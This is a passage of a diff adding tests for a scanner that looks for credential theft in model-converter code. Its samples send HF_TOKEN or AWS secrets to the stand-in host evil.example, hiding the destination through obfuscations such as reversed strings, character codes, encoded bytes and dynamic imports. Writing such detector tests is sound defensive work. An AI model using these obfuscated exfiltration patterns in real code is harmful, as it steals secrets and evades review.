+    for body in (
+        hub + 'url = "%(s)s://%(h)s/c" % {"s": "https", "h": "evil.example"}\n'
+        + send,
+        hub + 'url = "%(s)s://%(h)s/c" % parts\n' + send,
+        hub + 'url = "%s://%s/c" % (scheme, host)\n' + send,
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\nimport requests\n' + body
+            )
+        ], body
+
+    # A mapping template that spells the hub itself is read as the hub, which
+    # is what makes folding it worth doing rather than refusing the shape: the
+    # key has to be skipped over rather than read as the conversion, or every
+    # mapping template stays a hole and an honest one is refused.
+    assert scan_converter_source(
+        'import os\nimport requests\n'
+        + 'url = "%(s)s://%(h)s/api" % {"s": "https", "h": "huggingface.co"}\n'
+        + send
+    ) == []
+    # A key the mapping does not supply raises rather than folds, and erasing
+    # the template there left the destination unnamed instead of unreadable.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n' + hub
+            + 'url = "%(s)s://%(h)s/c" % {"s": "https"}\n' + send
+        )
+    ]
+
+    # A path built the same way, appended to the hub, is what honest code does.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'url = HUB + "/api/models/%s" % name\n' + send
+    ) == []
+
+
+def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
+    """No literal in the file is a URL at all."""
+    scan_converter_source = _load(
+        "converter_scan_inline_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n' + hub
+            + 'scheme = "https"\nseparator = "://"\nhost = "evil.example"\n'
+            + 'url = scheme + separator + host\n' + send
+        )
+    ]
+    # One constant can be assigned through another, and the substitution runs
+    # to a fixed point: scheme = "https"; alias = scheme leaves alias
+    # unreadable until scheme has been read, one pass earlier.
+    for body in (
+        'scheme = "https"\nalias = scheme\n'
+        'url = alias + "://evil.example/c"\n' + send,
+        'a = "https"\nb = a\nc = b\nurl = c + "://evil.example/c"\n' + send,
+        # A named expression binds a value like any other assignment, and
+        # dropping it left the name unreadable and the URL with it.
+        'if (scheme := "https"):\n'
+        '    url = scheme + "://evil.example/c"\n    ' + send,
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\nimport requests\n' + hub + body
+            )
+        ], body
+    # And the same chain over the hub is still the hub.
+    assert scan_converter_source(
+        'import os\nimport requests\n'
+        + 'base = "https://huggingface.co"\nalias = base\n'
+        + 'url = alias + "/api"\n' + send
+    ) == []
+
+    # The same assembly that names the hub is the hub, so this reads a
+    # destination rather than refusing every file that builds one.
+    assert scan_converter_source(
+        'import os\nimport requests\n'
+        + 'scheme = "https"\nseparator = "://"\nhost = "huggingface.co"\n'
+        + 'url = scheme + separator + host\n' + send
+    ) == []
+    # A name bound more than once holds no one value, so it stays a hole and
+    # the destination stays unreadable.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n'
+            + 'host = "evil.example"\n'
+            + 'url = "https://" + host\n' + send
+            + 'host = "huggingface.co"\n'
+        )
+    ]
+
+
+def test_percent_formatting_is_bounded_before_it_runs():
+    """The aggregate budget is spent on what the walk reads, and the operator runs
+    before that.
+    """
+    module = _load(
+        "converter_scan_percent_bound_probe", "unsloth_zoo/converter_scan.py",
+    )
+    source = (
+        'import os\nimport requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'url = "' + "%(x)s" * 1_000 + '" % {"x": "' + "A" * 50_000 + '"}\n'
+        'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
+    )
+    assert module.scan_converter_source(source) == []
+
+    # The tuple form has the same ceiling, and no output bound at all on it was
+    # the shape that got past the aggregate budget.
+    tuples = (
+        'import os\nimport requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'url = "' + "%s" * 500 + '" % ('
+        + ", ".join(['"' + "A" * 3_000 + '"'] * 500) + ')\n'
+        'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
+    )
+    assert module.scan_converter_source(tuples) == []
+
+
+def test_a_url_object_that_is_rewritten_refuses_the_hub_allowance():
+    """A carrier does not survive a call, on purpose: upstream writes
+    cls.get_list_tensors(url).items() and response = requests.get(url), and
+    tracking what came back out of those refused the very file this allowance
+    exists for.
+    """
+    scan_converter_source = _load(
+        "converter_scan_wrapper_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    preamble = (
+        'import os\nimport requests\nimport httpx\nimport yarl\n'
+        'from urllib.parse import urlparse\n'
+        'HUB = "https://huggingface.co"\n'
+    )
+    token = 'headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'httpx.get(httpx.URL(HUB).copy_with(host = "evil.example"), ' + token,
+        'httpx.get(yarl.URL(HUB).with_host("evil.example"), ' + token,
+        'httpx.get(urlparse(HUB)._replace(netloc = "evil.example").geturl(), '
+        + token,
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body)
+        ], body
+
+    # And the upstream shape this rule has to stay clear of: a helper is called
+    # with the URL and the result, which is tensor metadata rather than a URL,
+    # is read with an ordinary method.
+    assert scan_converter_source(
+        preamble
+        + 'url = f"{HUB}/api/models"\n'
+        + 'for k, v in cls.get_list_tensors(url).items():\n    pass\n'
+        + 'requests.get(url, ' + token
+    ) == []
+
+
+def test_a_url_builder_under_an_alias_or_a_result_object_refuses_it():
+    """Two more spellings of the same rewrite."""
+    scan_converter_source = _load(
+        "converter_scan_alias_builder_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    preamble = (
+        'import os\nimport requests\n'
+        'from urllib.parse import urljoin as j, ParseResult\n'
+        'import urllib.parse as up\n'
+        'HUB = "https://huggingface.co"\n'
+    )
+    send = 'requests.get(u, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'u = j(HUB, "//evil.example/collect")\n' + send,
+        'u = up.urljoin(HUB, "//evil.example/c")\n' + send,
+        'u = ParseResult("https", "evil.example", "/c", "", "", "").geturl()\n'
+        + send,
+        # A client URL object takes its host as a field, so no argument of it
+        # is a URL at all.
+        'import httpx\n'
+        'u = httpx.URL(scheme = "https", host = "evil.example", path = "/c")\n'
+        + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # Reading a parse result is what upstream does, twice, and it is not
+    # building one.
+    assert scan_converter_source(
+        preamble + 'u = f"{HUB}/api"\nassert up.urlparse(u).netloc\n' + send
+    ) == []
+
+
+def test_inlining_a_constant_is_charged_per_use():
+    """The budget is on what the substitution materialises, not on the name."""
+    module = _load(
+        "converter_scan_inline_budget_probe", "unsloth_zoo/converter_scan.py",
+    )
+    source = (
+        'import os\nimport requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'BIG = "' + "A" * 50_000 + '"\n'
+        'url = ' + " + ".join(["BIG"] * 100) + '\n'
+        'requests.get(HUB, params = {"t": os.environ["HF_TOKEN"]})\n'
+    )
+    # And running out refuses rather than analysing what it could not read:
+    # leaving the rest of the file unsubstituted is exactly the state a payload
+    # wants, a long constant ahead of the three short ones that spell a host.
+    assert [f.check for f in module.scan_converter_source(source)]
+    # Charged per use, so the substitution refuses this file rather than
+    # materialising five megabytes out of a 49 KB one.
+    import ast as ast_module
+    try:
+        module._inline_constants(ast_module.parse(source))
+    except module._FoldBudgetExceeded:
+        pass
+    else:
+        raise AssertionError("the substitution was charged once per name")
+    assert [
+        f.check for f in module.scan_converter_source(
+            'import os\nimport requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'PAD = "' + "A" * 600_000 + '"\n'
+            'pad_again = PAD\n'
+            'scheme = "https"\nsep = "://"\nhost = "evil.example/collect"\n'
+            'url = scheme + sep + host\n'
+            'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+    # Appending carries the same ceiling the join and the formatting do, since
+    # a chain of literal appends grows a prefix at every level whether a name
+    # was substituted into it or not: two operands over the limit are left
+    # unread rather than concatenated.
+    import ast as ast_module
+    oversized = ast_module.parse(
+        '"' + "A" * 600_000 + '" + "' + "B" * 600_000 + '"'
+    ).body[0].value
+    assert module._literal_text(oversized) is None
+
+    # A constant small enough to matter is still inlined, which is the whole
+    # point of doing it: this one assembles a destination.
+    assert [
+        f.check for f in module.scan_converter_source(
+            'import os\nimport requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'host = "evil.example"\n'
+            'url = "https://" + host\n'
+            'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+
+def test_a_destination_spelled_in_character_codes_refuses_it():
+    """bytearray([104, 116, 116, 112, 115]).decode() is a URL with no URL in it,
+    and so is "".join(chr(c) for c in codes).
+    """
+    scan_converter_source = _load(
+        "converter_scan_codes_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    preamble = (
+        'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    )
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'url = bytearray([104, 116, 116, 112, 115]).decode()\n' + send,
+        'url = bytes([104, 116, 116, 112]).decode()\n' + send,
+        'url = "".join(chr(c) for c in [104, 116, 116, 112])\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # What upstream writes: a bytearray over what came back from the hub.
+    assert scan_converter_source(
+        preamble
+        + 'url = f"{HUB}/api"\n'
+        + 'data = bytearray(get_data_by_range(url = url, start = 0))\n'
+        + send
+    ) == []
+
+
+def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
+    """"c/tcelloc/elpmaxe.live//:sptth"[::-1] is a whole URL written backwards, so
+    nothing matched a scheme and the hub literal beside it granted the
+    allowance.
+    """
+    module = _load(
+        "converter_scan_slice_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    token = 'headers = {"x": os.environ["HF_TOKEN"]})\n'
+
+    assert [
+        f.check for f in scan_converter_source(
+            preamble
+            + 'requests.get("c/tcelloc/elpmaxe.live//:sptth"[::-1], ' + token
+        )
+    ]
+    # A bound this cannot read, over text that spells no URL until it is
+    # sliced: the fold cannot help here, and not reading it is not a reason to
+    # say nothing.
+    assert [
+        f.check for f in scan_converter_source(
+            preamble
+            + 'requests.get("c/tcelloc/elpmaxe.live//:sptth"[::step], ' + token
+        )
+    ]
+
+    # Slicing what came back from the hub is what upstream does, and it is not
+    # a literal at all.
+    assert scan_converter_source(
+        preamble + 'url = f"{HUB}/api"\nraw = data[:8]\n'
+        + 'requests.get(url, ' + token
+    ) == []
+
+    assert [
+        f.check for f in scan_converter_source(
+            preamble + 'url = "' + "{}" * 262_000 + '".format(a)\n'
+            + 'requests.get(HUB, ' + token
+        )
+    ]
+    # A template of an ordinary size is still folded, which is what keeps the
+    # fifteen upstream .format() calls readable.
+    assert scan_converter_source(
+        preamble + 'url = "{}/api/models".format(HUB)\n'
+        + 'requests.get(url, ' + token
+    ) == []
+
+
+def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
+    """`j = urljoin` rebinds the builder with no import in sight, so following
+    import aliases was not enough: a single assignment of one name to another
+    is followed the same way.
+    """
+    module = _load(
+        "converter_scan_rebind_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\nfrom urllib.parse import urljoin\n'
+            'HUB = "https://huggingface.co"\n'
+            'j = urljoin\n'
+            'url = j(HUB, "//evil.example/collect")\n'
+            'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+    # The budget is on the folding, so it is asserted on the folding rather
+    # than on a clock: every fold is charged as it is produced, and a decision
+    # that runs out raises rather than carrying on.
+    import ast as ast_module
+    module._fold_state.budget = 1_000
+    try:
+        module._literal_text(
+            ast_module.parse('"' + "A" * 2_000 + '"').body[0].value
+        )
+    except module._FoldBudgetExceeded:
+        pass
+    else:
+        raise AssertionError("the fold was not charged")
+    finally:
+        del module._fold_state.budget
+
+    # And a file of joins that are each inside their own ceiling, 6.4 MB of
+    # them, is refused rather than folded through sixteen carrier passes.
+    one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n'
+            'HUB = "https://huggingface.co"\n'
+            + "".join(f"x{i} = {one}" for i in range(1_500))
+            + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+
+def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
+    """"".join(x for x in ("https", "://evil.example/c")) is a whole URL, and the
+    walk sees two pieces neither of which carries a scheme.
+    """
+    scan_converter_source = _load(
+        "converter_scan_join_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'url = "".join(x for x in ("https", "://evil.example/c"))\n' + send,
+        'url = "".join([x for x in ("https", "://evil.example/c")])\n' + send,
+        'url = "".join(pieces)\n' + send,
+        'url = "".join(map(str, ("https", "://evil.example/c")))\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # A separator this cannot read is not a hole either: it folded to one in
+    # the middle of a scheme, and str().join(("htt", "ps://evil.example/c"))
+    # read as htt<hole>ps://... with no destination anywhere.
+    for body in (
+        'url = str().join(("htt", "ps://evil.example/c"))\n' + send,
+        'url = sep.join(("htt", "ps://evil.example/c"))\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # Written out, and joined on a path this file states in full: still read.
+    assert scan_converter_source(
+        preamble + 'url = "/".join([HUB, "api", "models"])\n' + send
+    ) == []
+    # os.path.join is not a separator joining pieces.
+    assert scan_converter_source(
+        preamble + 'import os.path\np = os.path.join(root, name)\n'
+        + 'url = f"{HUB}/api"\n' + send
+    ) == []
+
+
+def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
+    """"https" * 1 + "://evil.example/c" carries its scheme in a repetition, which
+    was neither folded nor refused, so no literal in the file held a URL at
+    all.
+    """
+    module = _load(
+        "converter_scan_repeat_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'url = "https" * 1 + "://evil.example/c"\n' + send,
+        'url = "https" * n + "://evil.example/c"\n' + send,
+        'url = 1 * "https" + "://evil.example/c"\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # A reducer applies the same plus pairwise, which no fold can follow:
+    # functools.reduce(operator.add, ["https", "://evil.example/c"]) builds a
+    # URL out of pieces this reads one at a time.
+    for body in (
+        'import functools, operator\n'
+        'url = functools.reduce(operator.add, ["https", "://evil.example/c"])\n'
+        + send,
+        'import operator\nfrom functools import reduce as rd\n'
+        'url = rd(operator.add, ["https", "://evil.example/c"])\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # A count this cannot read leaves the text AND a hole, not only a hole:
+    # returning the hole alone made the multiplication look fully read, so the
+    # walk skipped its children and a URL written out in full named nothing.
+    assert [
+        f.check for f in scan_converter_source(
+            preamble + 'url = "https://evil.example/c" * n\n' + send
+        )
+    ]
+
+    # Repeating a separator is ordinary, and it names no destination.
+    assert scan_converter_source(
+        preamble + 'pad = "-" * 4\nurl = f"{HUB}/api"\n' + send
+    ) == []
+
+    import ast as ast_module
+    oversized = ast_module.parse(
+        '"' + "A" * 2_000 + '" * 1000'
+    ).body[0].value
+    assert module._literal_text(oversized) is None
+
+
+def test_a_string_method_called_unbound_is_still_that_method():
+    """Called unbound, the receiver is the type rather than the template, so every
+    rule that reads a receiver saw str and the template went past as an
+    ordinary argument: str.format("{}://{}", "https", "evil.example/c") named
+    no destination at all, and str.replace and str.join did the same.
+    """
+    scan_converter_source = _load(
+        "converter_scan_unbound_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'url = str.format("{}://{}", "https", "evil.example/c")\n' + send,
+        'url = str.replace("httpsX//evil.example/c", "X", ":")\n' + send,
+        'url = str.join("", ("htt", "ps://evil.example/c"))\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # The same spelling over the hub is read as the hub, not refused.
+    assert scan_converter_source(
+        preamble + 'url = str.format("{}/api", HUB)\n' + send
+    ) == []
+
+
+def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
+    """The honest hub download can stay in the file. smtplib.SMTP(
+    "evil.example").sendmail(..., os.environ["HF_TOKEN"]) makes both original
+    predicates true, and no walk over the literals can say where it sends,
+    because its destination is a bare host rather than a URL.
+    """
+    scan_converter_source = _load(
+        "converter_scan_client_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    download = 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'import smtplib\n'
+        'smtplib.SMTP("evil.example").sendmail("a", "b",'
+        ' os.environ["HF_TOKEN"])\n',
+        'import ftplib\n'
+        'ftplib.FTP("evil.example").storbinary("STOR x",'
+        ' os.environ["HF_TOKEN"].encode())\n',
+        'from websockets import connect as c\nc("wss://evil.example")\n',
+        # The member counts with its parent: from http import client is
+        # http.client, and reading the module alone saw only "http".
+        'from http import client\n'
+        'c = client.HTTPSConnection("evil.example")\n'
+        'c.putrequest("GET", "/")\n'
+        'c.putheader("a", os.environ["HF_TOKEN"])\nc.endheaders()\n',
+        'from urllib import request\nrequest.urlopen("http://evil.example")\n',
+        # asyncio is imported for all sorts of reasons, so the refusal is on
+        # the connection API rather than on the module: open_connection(
+        # "evil.example", 443) names a host and writelines is not a write this
+        # rule knows.
+        'import asyncio\n'
+        'reader, writer = asyncio.open_connection("evil.example", 443)\n'
+        'writer.writelines([os.environ["HF_TOKEN"].encode()])\n',
+        'from asyncio import open_connection as oc\noc("evil.example", 443)\n',
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body + download)
+        ], body
+
+    # An ordinary member of an ordinary module is not one of these, and
+    # neither is asyncio itself.
+    assert scan_converter_source(
+        preamble + 'from os import path\n' + download
+    ) == []
+    assert scan_converter_source(
+        preamble + 'import asyncio\nasyncio.run(main())\n' + download
+    ) == []
+
+    # The download on its own is what the allowance is for.
+    assert scan_converter_source(preamble + download) == []
+
+
+def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
+    """Two ways a binding happens with no line that looks like one."""
+    module = _load(
+        "converter_scan_dynamic_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    download = 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        '__import__("smtplib").SMTP("evil.example")'
+        '.sendmail("a", "b", os.environ["HF_TOKEN"])\n',
+        'import importlib\n'
+        'importlib.import_module("smtplib").SMTP("evil.example")\n',
+        'import importlib\nimportlib.import_module(mod).SMTP("evil.example")\n',
+        '__import__("base64").b64decode("aHR0cHM6")\n',
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body + download)
+        ], body
+
+    # And the call itself can be renamed: from importlib import import_module
+    # as im, im = importlib.import_module, imp = __import__.
+    for body in (
+        'from importlib import import_module as im\n'
+        'im("smtplib").SMTP("evil.example")\n',
+        'import importlib\nim = importlib.import_module\n'
+        'im("smtplib").SMTP("evil.example")\n',
+        'imp = __import__\nimp("smtplib").SMTP("evil.example")\n',
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body + download)
+        ], body
+
+    # And a computed lookup leaves the importer as a string and nothing else,
+    # exactly as the write methods and the environment names did.
+    for body in (
+        'import builtins\n'
+        'builtins.__dict__["__import__"]("smtplib").SMTP("evil.example")\n',
+        'import builtins\nbuiltins.__dict__["__imp" + "ort__"]("smtplib")\n',
+        'import importlib\nvars(importlib)["import_module"]("smtplib")\n',
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body + download)
+        ], body
+
+    # Importing something ordinary by name is not a reason to refuse.
+    assert scan_converter_source(
+        preamble + 'import importlib\nimportlib.import_module("json")\n'
+        + download
+    ) == []
+
+    import ast as ast_module
+    if sys.version_info < (3, 10):
+        return                          # no match statement to parse at all
+    captured = ast_module.parse(
+        'HOST = "https://huggingface.co"\n'
+        'match pair:\n'
+        '    case (scheme, HOST):\n'
+        '        pass\n'
+    )
+    assert "HOST" not in module._single_assignments(captured)
+    assert "HOST" in module._single_assignments(
+        ast_module.parse('HOST = "https://huggingface.co"\n')
+    )
+
+
+def test_the_allowance_runs_where_the_match_statement_does_not_exist():
+    """The package supports Python 3.9, where ast.MatchAs does not exist."""
+    import ast as ast_module
+
+    removed = {}
+    for name in ("MatchAs", "MatchStar", "MatchMapping"):
+        if hasattr(ast_module, name):
+            removed[name] = getattr(ast_module, name)
+            delattr(ast_module, name)
+    try:
+        module = _load(
+            "converter_scan_no_match_probe", "unsloth_zoo/converter_scan.py",
+        )
+        assert module.MATCH_CAPTURES == ()
+        assert module.scan_converter_source(
+            'import os\nimport requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+        ) == []
+    finally:
+        for name, value in removed.items():
+            setattr(ast_module, name, value)
+
+
+def test_a_descriptor_bound_to_a_name_is_still_that_method():
+    """r = str.replace then r(HUB, "huggingface.co", "evil.example") is the same
+    rewrite with the method behind a name, which no rule that reads a call site
+    could see.
+    """
+    scan_converter_source = _load(
+        "converter_scan_descriptor_alias_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    token = 'headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'r = str.replace\n'
+        'requests.get(r(HUB, "huggingface.co", "evil.example"), ' + token,
+        'f = str.format\n'
+        'requests.get(f("{}://{}", "https", "evil.example"), ' + token,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    assert scan_converter_source(preamble + 'requests.get(HUB, ' + token) == []
+
+
+def test_a_bytes_environment_read_and_a_called_plus_are_read():
+    """os.getenvb(b"AWS_SECRET_ACCESS_KEY") is the same read as os.getenv on Unix,
+    and exempting it left the collected set holding the hub token alone while a
+    hub GET carried both values.
+    """
+    module = _load(
+        "converter_scan_getenvb_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+
+    # Attributed by name, not merely refused as a read this cannot place: a
+    # bytes key is a key, and the allowance turns on which names are read.
+    import ast as ast_module
+    assert module._env_reads(
+        ast_module.parse('import os\nx = os.getenvb(b"AWS_SECRET_ACCESS_KEY")\n')
+    ) == ({"AWS_SECRET_ACCESS_KEY"}, False)
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    both = 'headers = {"a": os.environ["HF_TOKEN"], "b": other})\n'
+    send = 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'other = os.getenvb(b"AWS_SECRET_ACCESS_KEY")\n'
+        'requests.get(HUB, ' + both,
+        'import operator\n'
+        'url = operator.add("https", "://evil.example/c")\n' + send,
+        'url = "https".__add__("://evil.example/c")\n' + send,
+        'url = str.__add__("https", "://evil.example/c")\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # The other two operators that build a string are the same call in
+    # disguise, and folding them means standing the operator back up rather
+    # than repeating its rules: mod, mul, their in-place names and the dunders.
+    for body in (
+        'import operator\n'
+        'url = operator.mod("%s://%s/c", ("https", "evil.example"))\n' + send,
+        'from operator import mod\n'
+        'url = mod("%s://%s/c", ("https", "evil.example"))\n' + send,
+        'import operator\n'
+        'url = operator.mul("https", 1) + "://evil.example/c"\n' + send,
+        'url = "%s://%s/c".__mod__(("https", "evil.example"))\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+    # The hub through the same call is still the hub.
+    assert scan_converter_source(
+        preamble + 'import operator\nurl = operator.mod("%s/api", HUB)\n' + send
+    ) == []
+
+    # And the same function under its own name: from operator import add,
+    # aliased, or rebound. set.add is not one of these, since these take two.
+    for body in (
+        'from operator import add\nurl = add("https", "://evil.example/c")\n'
+        + send,
+        'from operator import add as a\nurl = a("https", "://evil.example/c")\n'
+        + send,
+        'import operator\na = operator.add\n'
+        'url = a("https", "://evil.example/c")\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+    assert scan_converter_source(
+        preamble + 'seen = set()\nseen.add("x")\nurl = f"{HUB}/api"\n' + send
+    ) == []
+
+    # The hub token read the same way is the read this allowance is for.
+    assert scan_converter_source(
+        preamble + 'token = os.getenvb(b"HF_TOKEN")\n'
+        + 'requests.get(HUB, headers = {"a": token})\n'
+    ) == []
+
+
+def test_two_scans_at_once_do_not_share_one_budget():
+    """The fold budget was a module global, so two exports running at once charged
+    the same counter and the first to finish cleared it under the second.
+    """
+    import threading
+
+    module = _load(
+        "converter_scan_threaded_probe", "unsloth_zoo/converter_scan.py",
+    )
+    clean = (
+        'import os\nimport requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    )
+    module._fold_state.budget = 4_096
+    # The charge is read from this thread's state, which is what makes the
+    # budget a property of one decision rather than of the process.
+    try:
+        module._charge_fold("x" * 4_097)
+    except module._FoldBudgetExceeded:
+        pass
+    else:
+        raise AssertionError("the charge did not read this thread's budget")
+
+    module._fold_state.budget = 4_096
+    verdicts = []
+    thread = threading.Thread(
+        target = lambda: verdicts.append(module.scan_converter_source(clean)),
+    )
+    thread.start()
+    thread.join()
+    assert verdicts == [[]]
+    assert module._fold_state.budget == 4_096
+    del module._fold_state.budget
+
+
+def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
+    """Bytes holding UTF-16 for an attacker URL are read here as UTF-8 replacement
+    text, so nothing in the file spelled a host, and decoding a literal is now
+    refused outright.
+    """
+    scan_converter_source = _load(
+        "converter_scan_decode_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = (
+        'requests.get(url, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    )
+    encoded = repr("https://evil.example/c".encode("utf-16"))
+    for body in (
+        f'url = {encoded}.decode("utf-16")\n' + send,
+        'url = "%cttps://evil.example/c" % 104\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # And a literal taken apart is put back together the same way:
+    for body in (
+        'parts = "https|://evil.example/c".split("|")\n'
+        'url = parts[0] + parts[1]\n' + send,
+        'a, _, b = "https|://evil.example/c".partition("|")\nurl = a + b\n'
+        + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # Splitting the download is ordinary, and it is not a literal.
+    assert scan_converter_source(
+        preamble + 'url = f"{HUB}/api"\n'
+        + 'lines = requests.get(url).text.split("\\n")\n' + send
+    ) == []
+
+    # Decoding the download is what upstream does, and the hub URL beside it
+    # is still read as the hub.
+    assert scan_converter_source(
+        preamble + 'url = f"{HUB}/api"\n'
+        + 'raw = requests.get(url).content.decode()\n' + send
+    ) == []
+
+
+def test_a_literal_transformed_by_any_unreadable_method_refuses_it():
+    """Named methods were losing one at a time: replace with dynamic arguments,
+    decode of UTF-16 bytes, split indexed back together, and then
+    "https".ljust(6, ":") turning a word into a scheme.
+    """
+    scan_converter_source = _load(
+        "converter_scan_any_method_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = (
+        'requests.get(url, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    )
+    for body in (
+        'url = "https".ljust(6, ":") + "//evil.example/c"\n' + send,
+        'url = "ttps://evil.example/c".rjust(23, "h")\n' + send,
+        'url = "HTTPS://EVIL.EXAMPLE/c".lower()\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # The constructors spell the same transformation with no method in sight.
+    payload = repr("https://evil.example/c".encode("utf-16le"))
+    for body in (
+        f'url = str({payload}, "utf-16le")\n' + send,
+        'url = bytes("https://evil.example/c", "utf-8").decode()\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    for body in (
+        'url = "{}/api".format(HUB)\n' + send,
+        'url = f"{HUB}/api/" + str(model_id)\n' + send,
+        'url = HUB + "/api"\nname = base.replace(" ", "-")\n' + send,
+    ):
+        assert scan_converter_source(preamble + body) == [], body
+
+
+def test_a_token_sent_over_plaintext_refuses_the_hub_allowance():
+    """The host is the hub and the scheme is http, so the credential goes out
+    where anyone on the path can read it.
+    """
+    scan_converter_source = _load(
+        "converter_scan_plaintext_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n'
+            'requests.get("http://huggingface.co",'
+            ' headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+    assert scan_converter_source(
+        'import os\nimport requests\n'
